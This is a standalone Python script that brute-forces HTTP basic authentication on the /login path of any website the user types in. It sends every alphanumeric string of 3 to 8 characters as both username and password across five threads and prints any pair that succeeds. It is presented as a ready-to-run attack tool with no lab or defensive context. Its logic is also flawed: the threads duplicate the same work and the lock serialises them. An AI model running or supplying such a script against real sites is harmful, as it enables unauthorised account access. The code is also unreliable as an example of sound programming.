import itertools
import requests
import threading

lock = threading.Lock()

def try_bruteforce(url, path, user, password):
    url = f"{url}/{path}"
    try:
        response = requests.get(url, auth=(user, password))
        if response.status_code == 200:
            print(f"[SUCCESS] Username: {user}, Password: {password}")
    except:
        pass

def bruteforce(url, path, chars, min_len, max_len):
    try:
        for n in range(min_len, max_len + 1):
            for candidate in itertools.product(chars, repeat=n):
                user = ''.join(candidate)
                lock.acquire()
                try_bruteforce(url, path, user, user)
                lock.release()
    except:
        pass

url = input("Enter Website URL: ")
path="login"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
min_len = 3
max_len = 8

threads = []

for i in range(5):
    thread = threading.Thread(target=bruteforce, args=(url, path, chars, min_len, max_len))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
